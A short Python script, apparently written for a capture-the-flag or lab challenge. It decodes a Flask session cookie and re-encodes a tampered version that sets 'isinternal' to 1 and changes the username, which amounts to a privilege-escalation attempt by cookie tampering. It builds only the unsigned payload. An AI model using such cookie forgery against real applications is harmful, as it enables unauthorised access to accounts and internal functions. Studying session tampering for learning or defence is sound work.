import hashlib
import json
import zlib
from base64 import *
from itsdangerous import base64_decode, base64_encode

def decode(payload):
    compressed = False
    if payload[0] == ".":        
        compressed = True
        
    payload = payload[1:]    
    data = payload.split(".")[0]
    data = base64_decode(data)
    
    if compressed:
        data = zlib.decompress(data)
        
    data = data.decode("utf-8")    
    return data

def hook(obj):
    if len(obj) != 1:
        return obj
    
    key, val = next(iter(obj.items()))    
    # I only handled 1 situation
    if key == ' t':
        pass #return tuple(val)
    elif key == ' u':
        pass #return UUID(val)
    elif key == ' b':
        return b64decode(val)
    elif key == ' m':
        pass #return Markup(val)
    elif key == ' d':
        pass #return parse_date(val)
     
    return obj

def encode(cookie):
    """ kinda trash concatenation but wrote w/lots of sleep dep"""
    out = "{"
    for key, val in iter(cookie.items()):        
        # {"isinternal":0,"role":{" b":"Q1VTVE9NRVI="},"username":{" b":"Z3Vlc3Q="}}
        if isinstance(val, bytes):
            encoded = b64encode(val)
            out += f'"{key}"' + ":{" + f'" b":"{encoded.decode()}"' + '},'
        else:
            out += f'"{key}":{val},'
    out = out[:-1] + '}'
    return out

cookie = {"isinternal": 1, "role": b"CUSTOMER", "username": b"supporttest"}
#cookie = {"isinternal": 0, "role": b"CUSTOMER", "username": b"guest"}

payload = ".eJyrVsoszswrSS3KS8xRsjLQUSrKz0lVsqpWUkhSslIKNAwLCXO19AsK87RVqtVRKi0GKcxFKIgyDstJNg4EStYCAGeGFq0.Ezp1rg.ZlRylTQ0tzAa0sSGe4eLn5FwGbI"
data = decode(payload)
print(json.loads(data, object_hook=hook))
encoded = encode(cookie).encode()
print(encoded)
compressed = zlib.compress(encoded)
print(compressed)
c = base64_encode(compressed)
flask_cookie_pt1 = json.dumps(c.decode())
print(flask_cookie_pt1)
